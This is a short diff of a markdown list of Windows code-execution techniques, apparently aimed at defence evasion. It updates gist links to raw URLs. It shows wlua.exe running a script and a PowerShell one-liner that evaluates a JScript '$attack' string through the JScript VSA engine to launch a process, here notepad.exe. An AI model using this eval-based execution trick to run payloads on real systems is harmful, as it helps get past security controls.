@@ -48,7 +48,7 @@ https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw
 ```
 wlua.exe C:\testing.wlua
 &- Hello World Exe My Code LUA
-https://gist.github.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3
+https://gist.githubusercontent.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3/raw/888f7e484651fdb733d6261ca002d684a6e5bf9b/Test.wlua
 ```
 
 ( 8 ) Jscript Execute Code Via ( Eval,VSA,) 
@@ -57,6 +57,6 @@ https://gist.github.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3
 $attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
 [Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
 &- Code Execute
-https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec
+https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw/4c8709382280de158b99dd78f91875e32a54bac4/ATPSJScript
 ```
 
